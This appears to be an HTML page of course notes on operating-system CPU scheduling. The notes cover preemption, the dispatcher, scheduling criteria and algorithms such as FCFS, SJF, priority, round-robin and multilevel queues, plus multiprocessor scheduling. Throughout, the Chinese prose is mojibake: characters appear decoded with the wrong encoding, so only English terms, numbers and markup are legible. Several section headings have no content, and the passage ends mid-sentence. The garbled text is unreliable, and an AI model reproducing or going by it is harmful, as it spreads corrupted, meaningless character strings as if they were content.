CPUè°ƒåº¦ç¨‹åº</h3><p>æ¯å½“CPUç©ºé—²æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°±å¿…é¡»ä»å°±ç»ªé˜Ÿåˆ—ä¸­é€‰æ‹©ä¸€ä¸ªè¿›ç¨‹æ¥æ‰§è¡Œã€‚è¿›ç¨‹é€‰æ‹©ç”±çŸ­æœŸè°ƒåº¦ç¨‹åºï¼ˆ short-termschedulerï¼‰æˆ–CPUè°ƒåº¦ç¨‹åºæ‰§è¡Œã€‚è°ƒåº¦ç¨‹åºä»å†…å­˜ä¸­é€‰æ‹©ä¸€ä¸ªèƒ½å¤Ÿæ‰§è¡Œçš„è¿›ç¨‹ï¼Œå¹¶ä¸ºä¹‹åˆ†é…CPUã€‚</p><h3 id="513-æŠ¢å è°ƒåº¦"><a class="markdownIt-Anchor" href="#513-æŠ¢å è°ƒåº¦"></a> 5.1.3 æŠ¢å è°ƒåº¦</h3><p>CPUè°ƒåº¦å†³ç­–å¯åœ¨å¦‚ä¸‹4ç§ç¯å¢ƒä¸‹å‘ç”Ÿï¼š</p><ul><li>å½“ä¸€ä¸ªè¿›ç¨‹ä»è¿è¡ŒçŠ¶æ€åˆ‡æ¢åˆ°ç­‰å¾…çŠ¶æ€ï¼ˆä¾‹å¦‚ï¼ŒI/Oè¯·æ±‚ï¼Œæˆ–è°ƒç”¨waitç­‰å¾…ä¸€ä¸ªå­è¿›ç¨‹çš„ç»ˆæ­¢ã€‰ã€‚</li><li>å½“ä¸€ä¸ªè¿›ç¨‹ä»è¿è¡ŒçŠ¶æ€åˆ‡æ¢åˆ°å°±ç»ªçŠ¶æ€ï¼ˆä¾‹å¦‚ï¼Œ å½“å‡ºç°ä¸­æ–­æ—¶ï¼‰ã€‚</li><li>å½“ä¸€ä¸ªè¿›ç¨‹ä»ç­‰å¾…çŠ¶æ€åˆ‡æ¢åˆ°å°±ç»ªçŠ¶æ€ï¼ˆä¾‹å¦‚ï¼ŒI/Oå®Œæˆï¼‰ã€‚</li><li>å½“ä¸€ä¸ªè¿›ç¨‹ç»ˆæ­¢æ—¶ã€‚</li></ul><p>å¯¹äºç¬¬1 å’Œç¬¬4 ä¸¤ç§æƒ…å†µï¼Œ æ²¡æœ‰é€‰æ‹©è€Œåªæœ‰è°ƒåº¦ã€‚ä¸€ä¸ªæ–°è¿›ç¨‹ï¼ˆå¦‚æœå°±ç»ªé˜Ÿåˆ—ä¸­å·²æœ‰ä¸€ä¸ªè¿›ç¨‹å­˜åœ¨ã€‰å¿…é¡»è¢«é€‰æ‹©æ‰§è¡Œã€‚ä¸è¿‡ï¼Œ å¯¹äºç¬¬2 å’Œç¬¬3 ä¸¤ç§æƒ…å†µï¼Œ å¯ä»¥è¿›è¡Œé€‰æ‹©ã€‚</p><p>å½“è°ƒåº¦åªèƒ½å‘ç”Ÿåœ¨ç¬¬1 å’Œç¬¬4 ä¸¤ç§æƒ…å†µä¸‹æ—¶ï¼Œç§°è°ƒåº¦æ–¹æ¡ˆæ˜¯<strong>éæŠ¢å çš„</strong>ï¼ˆ nonpreemptive)çš„æˆ–åä½œçš„ï¼ˆ cooperativeï¼‰ï¼šå¦åˆ™ï¼Œ ç§°è°ƒåº¦æ–¹æ¡ˆæ˜¯<strong>æŠ¢å çš„</strong>ï¼ˆpreemptiveï¼‰ã€‚é‡‡ç”¨éæŠ¢å è°ƒåº¦ï¼Œä¸€æ—¦CPU åˆ†é…ç»™ä¸€ä¸ªè¿›ç¨‹ï¼Œé‚£ä¹ˆè¯¥è¿›ç¨‹ä¼šä¸€ç›´ä½¿ç”¨CPU ç›´åˆ°è¿›ç¨‹ç»ˆæ­¢æˆ–åˆ‡æ¢åˆ°ç­‰å¾…çŠ¶æ€ã€‚</p><h3 id="514-åˆ†æ´¾ç¨‹åº"><a class="markdownIt-Anchor" href="#514-åˆ†æ´¾ç¨‹åº"></a> 5.1.4 åˆ†æ´¾ç¨‹åº</h3><p>åˆ†æ´¾ç¨‹åºæ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œç”¨æ¥å°†CPU çš„æ§åˆ¶äº¤ç»™ç”±çŸ­æœŸè°ƒåº¦ç¨‹åºé€‰æ‹©çš„è¿›ç¨‹ã€‚å…¶åŠŸèƒ½åŒ…æ‹¬ï¼š</p><ul><li>åˆ‡æ¢ä¸Šä¸‹æ–‡ã€‚</li><li>åˆ‡æ¢åˆ°ç”¨æˆ·æ¨¡å¼ã€‚</li><li>è·³è½¬åˆ°ç”¨æˆ·ç¨‹åºçš„åˆé€‚ä½ç½®ï¼Œ ä»¥é‡æ–°å¯åŠ¨ç¨‹åºã€‚</li></ul><p>åˆ†æ´¾ç¨‹åºåº”å°½å¯èƒ½å¿«ï¼Œ å› ä¸ºåœ¨æ¯æ¬¡è¿›ç¨‹åˆ‡æ¢æ—¶éƒ½è¦ä½¿ç”¨ã€‚åˆ†æ´¾ç¨‹åºåœæ­¢ä¸€ä¸ªè¿›ç¨‹è€Œå¯åŠ¨å¦ä¸€ä¸ªæ‰€è¦èŠ±çš„æ—¶é—´ç§°ä¸ºåˆ†æ´¾å»¶è¿Ÿï¼ˆdispatch latencyï¼‰ã€‚</p><h2 id="52-è°ƒåº¦å‡†åˆ™"><a class="markdownIt-Anchor" href="#52-è°ƒåº¦å‡†åˆ™"></a> 5.2 è°ƒåº¦å‡†åˆ™</h2><ul><li><strong>CPU ä½¿ç”¨ç‡</strong>ï¼š éœ€è¦ä½¿CPU å°½å¯èƒ½å¿™ã€‚ä»æ¦‚å¿µä¸Šè®²ï¼Œ CPU ä½¿ç”¨ç‡ä»0%ï½100%ã€‚å¯¹äºçœŸå®ç³»ç»Ÿï¼Œ å®ƒåº”ä»40% Cè½»è´Ÿè·ç³»ç»Ÿï¼‰ï½90%ï¼ˆé‡è´Ÿè·ç³»ç»Ÿï¼‰ã€‚</li><li><strong>ååé‡</strong>ï¼šå¦‚æœCPU å¿™äºæ‰§è¡Œè¿›ç¨‹ï¼Œé‚£ä¹ˆå°±æœ‰å·¥ä½œåœ¨å®Œæˆã€‚ä¸€ç§æµ‹é‡å·¥ä½œé‡çš„æ–¹æ³•ç§°ä¸ºåœ¨ååé‡ï¼Œ å®ƒæŒ‡ä¸€ä¸ªæ—¶é—´å•å…ƒå†…æ‰€å®Œæˆè¿›ç¨‹çš„æ•°é‡ã€‚å¯¹äºé•¿è¿›ç¨‹ï¼Œååé‡å¯èƒ½ä¸ºæ¯å°æ—¶ä¸€ä¸ªè¿›ç¨‹ï¼šå¯¹äºçŸ­è¿›ç¨‹ï¼Œ ååé‡å¯èƒ½ä¸ºæ¯ç§’10 ä¸ªè¿›ç¨‹ã€‚</li><li><strong>å‘¨è½¬æ—¶é—´</strong>ï¼šä»ä¸€ä¸ªç‰¹å®šè¿›ç¨‹çš„è§’åº¦æ¥çœ‹ï¼Œ ä¸€ä¸ªé‡è¦å‡†åˆ™æ˜¯è¿è¡Œè¯¥è¿›ç¨‹éœ€è¦å¤šé•¿æ—¶é—´ã€‚ä»è¿›ç¨‹æäº¤åˆ°è¿›ç¨‹å®Œæˆçš„æ—¶é—´æ®µç§°ä¸ºå‘¨è½¬æ—¶é—´ã€‚å‘¨è½¬æ—¶é—´ä¸ºæ‰€æœ‰æ—¶é—´æ®µä¹‹å’Œï¼Œ åŒ…æ‹¬ç­‰å¾…è¿›å…¥å†…å­˜ã€åœ¨å°±ç»ªé˜Ÿåˆ—ä¸­ç­‰å¾…ã€åœ¨CPU ä¸Šæ‰§è¡Œå’ŒI/Oæ‰§è¡Œã€‚</li><li><strong>ç­‰å¾…æ—¶é—´</strong>ï¼š CPU è°ƒåº¦ç®—æ³•å¹¶ä¸å½±å“è¿›ç¨‹è¿è¡Œå’Œæ‰§è¡ŒI/Oçš„æ—¶é—´ï¼š å®ƒåªå½±å“è¿›ç¨‹åœ¨å°±ç»ªé˜Ÿåˆ—ä¸­ç­‰å¾…æ‰€èŠ±çš„æ—¶é—´ã€‚ç­‰å¾…æ—¶é—´ä¸ºåœ¨å°±ç»ªé˜Ÿåˆ—ä¸­ç­‰å¾…æ‰€èŠ±è´¹æ—¶é—´ä¹‹å’Œã€‚</li><li><strong>å“åº”æ—¶é—´</strong>ï¼š å¯¹äºäº¤äº’ç³»ç»Ÿï¼Œ å‘¨è½¬æ—¶é—´å¹¶ä¸æ˜¯æœ€ä½³å‡†åˆ™ã€‚é€šå¸¸ï¼Œ è¿›ç¨‹èƒ½ç›¸å½“æ—©å°±äº§ç”Ÿè¾“å‡ºï¼Œ å¹¶ç»§ç»­è®¡ç®—æ–°ç»“æœåŒæ—¶è¾“å‡ºä»¥å‰çš„ç»“æœç»™ç”¨æˆ·ã€‚å› æ­¤ï¼Œ å¦ä¸€æ—¶é—´æ˜¯ä»æäº¤è¯·æ±‚åˆ°äº§ç”Ÿç¬¬ä¸€å“åº”çš„æ—¶é—´ã€‚è¿™ç§æ—¶é—´ç§°ä¸ºå“åº”æ—¶é—´ï¼Œ æ˜¯å¼€å§‹å“åº”æ‰€éœ€è¦çš„æ—¶é—´ï¼Œ è€Œä¸æ˜¯è¾“å‡ºå“åº”æ‰€éœ€è¦çš„æ—¶é—´ã€‚å‘¨è½¬æ—¶é—´é€šå¸¸å—è¾“å‡ºè®¾å¤‡é€Ÿåº¦çš„é™åˆ¶ã€‚</li></ul><p>éœ€è¦ä½¿CPU ä½¿ç”¨ç‡å’Œååé‡æœ€å¤§åŒ–ï¼Œè€Œä½¿å‘¨è½¬æ—¶é—´ã€ç­‰å¾…æ—¶é—´å’Œå“åº”æ—¶é—´æœ€å°åŒ–ã€‚</p><h2 id="53-è°ƒåº¦ç®—æ³•"><a class="markdownIt-Anchor" href="#53-è°ƒåº¦ç®—æ³•"></a> 5.3 è°ƒåº¦ç®—æ³•</h2><h3 id="531-å…ˆåˆ°å…ˆæœåŠ¡è°ƒåº¦fcfs"><a class="markdownIt-Anchor" href="#531-å…ˆåˆ°å…ˆæœåŠ¡è°ƒåº¦fcfs"></a> 5.3.1 å…ˆåˆ°å…ˆæœåŠ¡è°ƒåº¦ï¼ˆFCFSï¼‰</h3><p><strong>first-comeï¼Œfirst-served</strong></p><p>å…ˆè¯·æ±‚CPU çš„è¿›ç¨‹å…ˆåˆ†é…åˆ°CPUã€‚</p><p>FCFSæ˜¯éæŠ¢å çš„</p><p><img src="/posts/8ce3e425/image-20211103111439645.png" alt="image-20211103111439645"></p><h3 id="532-æœ€çŸ­ä½œä¸šä¼˜å…ˆè°ƒåº¦sjf"><a class="markdownIt-Anchor" href="#532-æœ€çŸ­ä½œä¸šä¼˜å…ˆè°ƒåº¦sjf"></a> 5.3.2 æœ€çŸ­ä½œä¸šä¼˜å…ˆè°ƒåº¦(SJF)</h3><p><strong>shortest job-first (SJF) scheduling algorithm</strong></p><p>è¿™ä¸€ç®—æ³•å°†æ¯ä¸ªè¿›ç¨‹ä¸å…¶ä¸‹ä¸€ä¸ªCPU åŒºé—´æ®µç›¸å…³è”ã€‚å½“CPU ä¸ºç©ºé—²æ—¶ï¼Œå®ƒä¼šèµ‹ç»™å…·æœ‰æœ€çŸ­CPU åŒºé—´çš„è¿›ç¨‹ã€‚</p><p><img src="/posts/8ce3e425/image-20211103112112804.png" alt="image-20211103112112804"></p><p>SJF è°ƒåº¦ç®—æ³•å¯è¯æ˜ä¸ºæœ€ä½³çš„ï¼Œ è¿™æ˜¯å› ä¸ºå¯¹äºç»™å®šçš„ä¸€ç»„è¿›ç¨‹ï¼Œ SJF ç®—æ³•çš„å¹³å‡ç­‰å¾…æ—¶é—´æœ€å°ã€‚</p><p>SJFè°ƒåº¦ç»å¸¸ç”¨äºé•¿æœŸè°ƒåº¦ã€‚</p><p>å¯¹äºçŸ­æœŸè°ƒåº¦ï¼Œä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨è¿‘ä¼¼SJFè°ƒåº¦ï¼Œè™½ç„¶ä¸çŸ¥é“ä¸‹ä¸€ä¸ªCPUåŒºé—´çš„é•¿åº¦ï¼Œä½†æ˜¯å¯ä»¥é¢„æµ‹å®ƒã€‚è®¤ä¸ºä¸‹ä¸€ä¸ªCPUåŒºé—´çš„é•¿åº¦ä¸ä»¥å‰çš„ç›¸ä¼¼ã€‚ä¸‹ä¸€ä¸ªCPUåŒºé—´é€šå¸¸å¯é¢„æµ‹ä¸ºä»¥å‰CPUåŒºé—´çš„æµ‹é‡é•¿åº¦çš„æŒ‡æ•°å¹³å‡ã€‚</p><p>SJF ç®—æ³•å¯èƒ½æ˜¯æŠ¢å çš„æˆ–éæŠ¢å çš„ã€‚</p><p>æŠ¢å SJF è°ƒåº¦æœ‰æ—¶ç§°ä¸º<strong>æœ€çŸ­å‰©ä½™æ—¶é—´ä¼˜å…ˆè°ƒåº¦</strong>ï¼ˆshortest-remaining-time-first schedulingï¼‰ã€‚</p><p><img src="/posts/8ce3e425/image-20211103113129077.png" alt="image-20211103113129077"></p><h3 id="533-ä¼˜å…ˆçº§è°ƒåº¦"><a class="markdownIt-Anchor" href="#533-ä¼˜å…ˆçº§è°ƒåº¦"></a> 5.3.3 ä¼˜å…ˆçº§è°ƒåº¦</h3><p><strong>priority scheduling algorithm</strong></p><p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªä¼˜å…ˆçº§ä¸å…¶å…³è”ï¼Œå…·æœ‰æœ€é«˜ä¼˜å…ˆçº§çš„è¿›ç¨‹ä¼šåˆ†é…åˆ°CPUã€‚å…·æœ‰ç›¸åŒä¼˜å…ˆçº§çš„è¿›ç¨‹æŒ‰FCFS é¡ºåºè°ƒåº¦ã€‚SJF ç®—æ³•å±äºç®€å•ä¼˜å…ˆçº§ç®—æ³•ï¼Œå…¶ä¼˜å…ˆçº§ï¼ˆpï¼‰ ä¸ºä¸‹ä¸€ä¸ªï¼ˆé¢„æµ‹çš„ï¼‰ CPU åŒºé—´çš„å€’æ•°ã€‚</p><p><img src="/posts/8ce3e425/image-20211103113523515.png" alt="image-20211103113523515"></p><p>ä¼˜å…ˆè°ƒåº¦å¯ä»¥æ˜¯<strong>æŠ¢å çš„æˆ–è€…éæŠ¢å </strong>çš„ã€‚å½“ä¸€ä¸ªè¿›ç¨‹åˆ°è¾¾å°±ç»ªé˜Ÿåˆ—æ—¶ï¼Œ å…¶ä¼˜å…ˆçº§ä¸å½“å‰è¿è¡Œè¿›ç¨‹çš„ä¼˜å…ˆçº§ç›¸æ¯”è¾ƒã€‚å¦‚æœæ–°åˆ°è¾¾è¿›ç¨‹çš„ä¼˜å…ˆçº§é«˜äºå½“å‰è¿è¡Œè¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œé‚£ä¹ˆæŠ¢å ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ä¼šæŠ¢å CPUã€‚è€ŒéæŠ¢å ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•åªæ˜¯å°†æ–°è¿›ç¨‹åŠ åˆ°å°±ç»ªé˜Ÿåˆ—çš„å¤´éƒ¨ã€‚</p><p>ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•çš„ä¸€ä¸ªä¸»è¦é—®é¢˜æ˜¯<strong>æ— ç©·é˜»å¡</strong>ï¼ˆindefinite blockingï¼‰æˆ–é¥¥é¥¿ï¼ˆ starvationï¼‰ã€‚å¯ä»¥è¿è¡Œä½†ç¼ºä¹CPU çš„è¿›ç¨‹å¯è®¤ä¸ºæ˜¯é˜»å¡çš„ï¼Œå®ƒåœ¨ç­‰å¾…CPUã€‚ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ä¼šä½¿æŸä¸ªä½ä¼˜å…ˆçº§è¿›ç¨‹æ— ç©·ç­‰å¾…CPUã€‚</p><p>ä½ä¼˜å…ˆçº§è¿›ç¨‹æ— ç©·ç­‰å¾…é—®é¢˜çš„è§£å†³ä¹‹ä¸€æ˜¯<strong>è€åŒ–</strong>ï¼ˆagingï¼‰ã€‚è€åŒ–æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œä»¥é€æ¸å¢åŠ åœ¨ç³»ç»Ÿä¸­ç­‰å¾…å¾ˆé•¿æ—¶é—´çš„è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚</p><h3 id="534-è½®è½¬æ³•è°ƒåº¦rr"><a class="markdownIt-Anchor" href="#534-è½®è½¬æ³•è°ƒåº¦rr"></a> 5.3.4 è½®è½¬æ³•è°ƒåº¦(RR)</h3><p>è½®è½¬æ³•ï¼ˆround-robin, RRï¼‰ è°ƒåº¦ç®—æ³•æ˜¯ä¸“é—¨ä¸ºåˆ†æ—¶ç³»ç»Ÿè®¾è®¡çš„ã€‚å®ƒç±»ä¼¼äºFCFS è°ƒåº¦ï¼Œä½†æ˜¯å¢åŠ äº†æŠ¢å ä»¥åˆ‡æ¢è¿›ç¨‹ã€‚å®šä¹‰ä¸€ä¸ªè¾ƒå°æ—¶é—´å•å…ƒç§°ä¸ºæ—¶é—´ç‰‡ï¼ˆ time quantun, or time slice)ã€‚æ—¶é—´ç‰‡é€šå¸¸ä¸º10~100msã€‚å°†å°±ç»ªé˜Ÿåˆ—ä½œä¸ºå¾ªç¯é˜Ÿåˆ—ã€‚CPUè°ƒåº¦ç¨‹åºå¾ªç¯å°±ç»ªé˜Ÿåˆ—ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…ä¸è¶…è¿‡ãƒ¼ä¸ªæ—¶é—´ç‰‡çš„CPUã€‚</p><p><img src="/posts/8ce3e425/image-20211103114645373.png" alt="image-20211103114645373"></p><p>RRç®—æ³•çš„æ€§èƒ½å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºæ—¶é—´ç‰‡çš„å¤§å°ã€‚åœ¨æç«¯æƒ…å†µä¸‹ï¼Œå¦‚æœæ—¶é—´ç‰‡éå¸¸å¤§ï¼Œé‚£ä¹ˆRRç®—æ³•ä¸FCFSç®—æ³•ä¸€æ ·ï¼Œå¦‚æœæ—¶é—´ç‰‡å¾ˆå°(å¦‚1ms):é‚£ä¹ˆRRç®—æ³•ç§°ä¸ºå¤„ç†å™¨å…±äº«ã€‚</p><h3 id="535-å¤šçº§é˜Ÿåˆ—è°ƒåº¦"><a class="markdownIt-Anchor" href="#535-å¤šçº§é˜Ÿåˆ—è°ƒåº¦"></a> 5.3.5 å¤šçº§é˜Ÿåˆ—è°ƒåº¦</h3><p><strong>å¤šçº§é˜Ÿåˆ—è°ƒåº¦ç®—æ³•</strong>ï¼ˆmultilevel queue scheduling algorithmï¼‰å°†å°±ç»ªé˜Ÿåˆ—åˆ†æˆå¤šä¸ªç‹¬ç«‹é˜Ÿåˆ—ï¼ˆè§å›¾5.6ã€•ã€‚æ ¹æ®è¿›ç¨‹çš„å±æ€§ï¼Œ å¦‚å†…å­˜å¤§å°ã€è¿›ç¨‹ä¼˜å…ˆçº§ã€è¿›ç¨‹ç±»å‹ï¼Œ ä¸€ä¸ªè¿›ç¨‹è¢«æ°¸ä¹…åœ°åˆ†é…åˆ°ä¸€ä¸ªé˜Ÿåˆ—ã€‚æ¯ä¸ªé˜Ÿåˆ—æœ‰è‡ªå·±çš„è°ƒåº¦ç®—æ³•ã€‚ä¾‹å¦‚ï¼Œ å‰å°è¿›ç¨‹å’Œåå°è¿›ç¨‹å¯å¤„äºä¸åŒé˜Ÿåˆ—ã€‚å‰å°é˜Ÿåˆ—å¯èƒ½é‡‡ç”¨RR ç®—æ³•è°ƒåº¦ï¼Œ è€Œåå°é˜Ÿåˆ—å¯èƒ½é‡‡ç”¨FCFS ç®—æ³•è°ƒåº¦ã€‚</p><p><img src="/posts/8ce3e425/image-20220109135201389.png" alt="image-20220109135201389"></p><p>å¦å¤–ï¼Œ é˜Ÿåˆ—ä¹‹é—´å¿…é¡»æœ‰è°ƒåº¦ï¼Œ é€šå¸¸é‡‡ç”¨å›ºå®šä¼˜å…ˆçº§æŠ¢å è°ƒåº¦ã€‚ä¾‹å¦‚ï¼Œ å‰å°é˜Ÿåˆ—å¯ä»¥æ¯”åå°é˜Ÿåˆ—å…·æœ‰ç»å¯¹çš„ä¼˜å…ˆçº§ã€‚ä¸”æ˜¯æŠ¢å å¼çš„ã€‚</p><p>å¦ä¸€ç§å¯èƒ½æ˜¯åœ¨é˜Ÿåˆ—ä¹‹é—´åˆ’åˆ†æ—¶é—´ç‰‡ã€‚æ¯ä¸ªé˜Ÿåˆ—éƒ½æœ‰ä¸€å®šçš„CPUæ—¶é—´ï¼Œè¿™å¯ç”¨äºè°ƒåº¦é˜Ÿåˆ—å†…çš„è¿›ç¨‹ã€‚ä¾‹å¦‚ï¼Œ å¯¹äºå‰å°ï¼åå°é˜Ÿåˆ—çš„ä¾‹å­ï¼Œ å‰å°é˜Ÿåˆ—å¯ä»¥æœ‰80%çš„CPUæ—¶é—´ç”¨äºåœ¨è¿›ç¨‹ä¹‹é—´è¿›è¡ŒRRè°ƒåº¦ï¼Œ è€Œåå°é˜Ÿåˆ—å¯ä»¥æœ‰20%çš„CPUæ—¶é—´é‡‡ç”¨FCFSç®—æ³•è°ƒåº¦è¿›ç¨‹ã€‚</p><p>ä¼˜ç‚¹æ˜¯ä½è°ƒåº¦å¼€é”€ï¼Œ ç¼ºç‚¹æ˜¯ä¸å¤Ÿçµæ´»</p><h3 id="536-å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦"><a class="markdownIt-Anchor" href="#536-å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦"></a> 5.3.6 å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦</h3><p><strong>å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦ç®—æ³•</strong>ï¼ˆmultilevelfeedback queue scheduling a lgorithmï¼‰å…è®¸è¿›ç¨‹åœ¨é˜Ÿåˆ—ä¹‹é—´ç§»åŠ¨ã€‚ä¸»è¦æ€æƒ³æ˜¯æ ¹æ®ä¸åŒCPUåŒºé—´çš„ç‰¹ç‚¹ä»¥åŒºåˆ†è¿›ç¨‹ã€‚å¦‚æœè¿›ç¨‹ä½¿ç”¨è¿‡å¤šCPUæ—¶é—´ï¼Œ é‚£ä¹ˆå®ƒä¼šè¢«è½¬ç§»åˆ°æ›´ä½ä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚è¿™ç§æ–¹æ¡ˆå°†I/Oçº¦æŸå’Œäº¤äº’è¿›ç¨‹ç•™åœ¨æ›´é«˜ä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚æ­¤å¤–ï¼Œ åœ¨è¾ƒä½ä¼˜å…ˆçº§é˜Ÿåˆ—ä¸­ç­‰å¾…æ—¶é—´è¿‡é•¿çš„è¿›ç¨‹ä¼šè¢«è½¬ç§»åˆ°æ›´é«˜ä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚è¿™ç§å½¢å¼çš„è€åŒ–é˜»æ­¢é¥¥é¥¿çš„å‘ç”Ÿã€‚</p><p><img src="/posts/8ce3e425/image-20220109135218552.png" alt="image-20220109135218552"></p><h2 id="54-å¤šå¤„ç†å™¨è°ƒåº¦"><a class="markdownIt-Anchor" href="#54-å¤šå¤„ç†å™¨è°ƒåº¦"></a> 5.4 å¤šå¤„ç†å™¨è°ƒåº¦</h2><h3 id="541-å¤šå¤„ç†å™¨è°ƒåº¦çš„æ–¹æ³•"><a class="markdownIt-Anchor" href="#541-å¤šå¤„ç†å™¨è°ƒåº¦çš„æ–¹æ³•"></a> 5.4.1 å¤šå¤„ç†å™¨è°ƒåº¦çš„æ–¹æ³•</h3><p>ä¸€ç§æ˜¯ç§<strong>éå¯¹ç§°å¤šå¤„ç†</strong>ï¼ˆasymmetric multiprocessingï¼‰æ–¹æ³•ã€‚æ˜¯è®©ä¸€ä¸ªå¤„ç†å™¨ï¼ˆä¸»æœåŠ¡å™¨ï¼‰å¤„ç†æ‰€æœ‰çš„è°ƒåº¦å†³å®šã€I/Oå¤„ç†ä»¥åŠå…¶ä»–ç³»ç»Ÿæ´»åŠ¨ï¼Œ å…¶ä»–çš„å¤„ç†å™¨åªæ‰§è¡Œç”¨æˆ·ä»£ç ã€‚</p><p>å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨<strong>å¯¹ç§°å¤šå¤„ç†</strong>ï¼ˆ symmetric multiprocessing, <strong>SMP</strong>ï¼‰æ–¹æ³•ï¼Œ å³æ¯ä¸ªå¤„ç†å™¨è‡ªæˆ‘è°ƒåº¦ã€‚æ‰€æœ‰è¿›ç¨‹å¯èƒ½å¤„äºä¸€ä¸ªå…±åŒçš„å°±ç»ªé˜Ÿåˆ—ä¸­ï¼Œ æˆ–æ¯ä¸ªå¤„ç†å™¨éƒ½æœ‰å®ƒè‡ªå·±çš„ç§æœ‰å°±ç»ªè¿›ç¨‹é˜Ÿåˆ—ã€‚æ— è®ºå¦‚ä½•ï¼Œè°ƒåº¦é€šè¿‡æ¯ä¸ªå¤„ç†å™¨æ£€æŸ¥å…±åŒå°±ç»ªé˜Ÿåˆ—å¹¶é€‰æ‹©ä¸€ä¸ªè¿›ç¨‹æ¥æ‰§è¡Œã€‚</p><h3 id="542-å¤„ç†å™¨äº²å’Œæ€§"><a class="markdownIt-Anchor" href="#542-å¤„ç†å™¨äº²å’Œæ€§"></a> 5.4.2 å¤„ç†å™¨äº²å’Œæ€§</h3><p>å¤„ç†å™¨äº²å’Œæ€§æœ‰å‡ ç§å½¢å¼ã€‚å½“ä¸€ä¸ªæ“ä½œç³»ç»Ÿå…·æœ‰è®¾æ³•è®©ä¸€ä¸ªè¿›ç¨‹ä¿æŒåœ¨åŒä¸€ä¸ªå¤„ç†å™¨ä¸Šè¿è¡Œçš„ç­–ç•¥ï¼Œ ä½†ä¸èƒ½åšä»»ä½•ä¿è¯æ—¶ï¼Œ åˆ™ä¼šå‡ºç°<strong>è½¯äº²å’Œæ€§</strong>ï¼ˆ soft affinity ï¼‰ã€‚ æ­¤æ—¶ï¼Œ è¿›ç¨‹å¯èƒ½åœ¨å¤„ç†å™¨ä¹‹é—´ç§»åŠ¨ã€‚æœ‰äº›ç³»ç»Ÿï¼Œ å¦‚Linuxï¼Œ è¿˜æä¾›ä¸€ä¸ªæ”¯æŒ<strong>ç¡¬äº²å’Œæ€§</strong>ï¼ˆ hard affinityï¼‰ çš„ç³»ç»Ÿè°ƒç”¨ï¼Œ ä»è€Œå…è®¸è¿›ç¨‹æŒ‡å®šå®ƒä¸å…è®¸ç§»è‡³å…¶ä»–å¤„ç†å™¨ä¸Šã€‚</p><h3 id="543-è´Ÿè½½å¹³è¡¡"><a class="markdownIt-Anchor" href="#543-è´Ÿè½½å¹³è¡¡"></a> 5.4.3 è´Ÿè½½å¹³è¡¡</h3><h3 id="544-å¯¹ç§°å¤šçº¿ç¨‹"><a class="markdownIt-Anchor" href="#544-å¯¹ç§°å¤šçº¿ç¨‹"></a> 5.4.4 å¯¹ç§°å¤šçº¿ç¨‹</h3><h2 id="55-çº¿ç¨‹è°ƒåº¦"><a class="markdownIt-Anchor" href="#55-çº¿ç¨‹è°ƒåº¦"></a> 5.5 çº¿ç¨‹è°ƒåº¦</h2><h3 id="551-ç«äº‰èŒƒå›½"><a class="markdownIt-Anchor" href="#551-ç«äº‰èŒƒå›½"></a> 5.5.1 ç«äº‰èŒƒå›½</h3><h3 id="552-pthreadè°ƒåº¦"><a class="markdownIt-Anchor" href="#552-pthreadè°ƒåº¦"></a> 5.5.2 Pthreadè°ƒåº¦</h3><h2 id="56-æ“ä½œç³»ç»Ÿå®ä¾‹"><a class="markdownIt-Anchor" href="#56-æ“ä½œç³»ç»Ÿå®ä¾‹"></a> 5.6 æ“ä½œç³»ç»Ÿå®ä¾‹</h2><h3 id="561-å®ä¾‹solarisè°ƒåº¦"><a class="markdownIt-Anchor" href="#561-å®ä¾‹solarisè°ƒåº¦"></a> 5.6.1 å®ä¾‹ï¼šSolarisè°ƒåº¦</h3><h3 id="562-å®ä¾‹windows-xpè°ƒåº¦"><a class="markdownIt-Anchor" href="#562-å®ä¾‹windows-xpè°ƒåº¦"></a> 5.6.2 å®ä¾‹ï¼šWindows XPè°ƒåº¦</h3><h3 id="563-å®ä¾‹linuxè°ƒåº¦"><a class="markdownIt-Anchor" href="#563-å®ä¾‹linuxè°ƒåº¦"></a> 5.6.3 å®ä¾‹ï¼šLinuxè°ƒåº¦</h3><h2 id="57-ç®—æ³•è¯„ä¼°"><a class="markdownIt-Anchor" href="#57-ç®—æ³•è¯„ä¼°"></a> 5.7 ç®—æ³•è¯„ä¼°</h2><h3 id="571-ç¡®å®šæ¨¡å‹"><a class="markdownIt-Anchor" href="#571-ç¡®å®šæ¨¡å‹"></a> 5.7.1 ç¡®å®šæ¨¡å‹</h3><p>ä¸€ç§ç±»å‹çš„åˆ†æè¯„ä¼°æ˜¯ç¡®å®šæ¨¡å‹æ³•ï¼ˆ deterministic modelingï¼‰ã€‚è¿™ç§æ–¹æ³•é‡‡ç”¨ç‰¹æ®Šé¢„å…ˆç¡®å®šçš„è´Ÿè·ï¼Œ è®¡ç®—åœ¨ç»™å®šè´Ÿè·ä¸‹æ¯ä¸ªç®—æ³•çš„æ€§èƒ½ã€‚</p><p>ç¡®å®šæ¨¡å‹ä¸ä½†ç®€å•è€Œä¸”å¿«é€Ÿã€‚å®ƒç»™å‡ºäº†æ•°å­—ï¼Œ ä»¥å…è®¸äººä»¬å¯¹ç®—æ³•è¿›è¡Œæ¯”è¾ƒã€‚ç„¶è€Œï¼Œ å®ƒè¦æ±‚è¾“å…¥ä¸ºç²¾ç¡®æ•°å­—ï¼Œ 